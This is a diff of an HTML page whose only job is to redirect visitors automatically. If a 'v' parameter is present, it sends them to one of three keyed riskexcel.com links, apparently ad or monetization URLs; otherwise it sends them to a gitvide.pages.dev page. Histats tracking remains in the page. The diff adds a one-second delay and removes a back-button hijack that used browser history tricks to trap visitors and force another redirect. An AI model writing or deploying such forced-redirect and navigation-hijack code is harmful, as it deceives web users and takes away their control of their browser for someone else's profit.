@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script>
-        
         function getParameterByName(name) {
             name = name.replace(/[\[\]]/g, "\\$&");
             var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
@@ -13,54 +12,33 @@
             if (!results[2]) return '';
             return decodeURIComponent(results[2].replace(/\+/g, " "));
         }
-
-        
         function redirectToRandomUrl() {
             var vValue = getParameterByName('v');
             
-           
+            // Daftar URL acak
             var urls = [
                 "https://riskexcel.com/eb8fasy9eh?key=b8d65accc85804374e50843f106b08ba",
                 "https://riskexcel.com/mq7c1s55n?key=fbc667cce8ba9b8b925d1b08586dc24e",
                 "https://riskexcel.com/pyekm3r0?key=1a96bea5e1df18361e158240b915f956"
             ];
 
-            
+            // URL default jika tidak ada parameter 'v'
             var defaultUrl = "https://gitvide.pages.dev/redirect";
 
-            
-            if (vValue) {
-                var randomIndex = Math.floor(Math.random() * urls.length);
-                var randomUrl = urls[randomIndex];
-                window.location.href = randomUrl;
-            } else {
-                
-                window.location.href = defaultUrl;
-            }
+            setTimeout(function() {
+                if (vValue) {
+                    var randomIndex = Math.floor(Math.random() * urls.length);
+                    var randomUrl = urls[randomIndex];
+                    window.location.href = randomUrl;
+                } else {
+                    window.location.href = defaultUrl;
+                }
+            }, 1000);
         }
-
-        
         window.onload = redirectToRandomUrl;
     </script>
 </head>
 <body>
-</script>
-	<script type='text/javascript'>
-	(function(window, location) {
-            history.replaceState(null, document.title, location.pathname + "#!/history");
-            history.pushState(null, document.title, location.pathname);
-            
-            window.addEventListener("popstate", function() {
-                if (location.hash === "#!/history") {
-                    history.replaceState(null, document.title, location.pathname);
-                    setTimeout(function() {
-                        location.replace("https://gitvide.pages.dev/");
-                    }, 0);
-                }
-            }, false);
-        }(window, location));
-
-</script>
 
 <script type="text/javascript">var _Hasync= _Hasync|| [];
 _Hasync.push(['Histats.start', '1,4914312,4,0,0,0,00010000']);
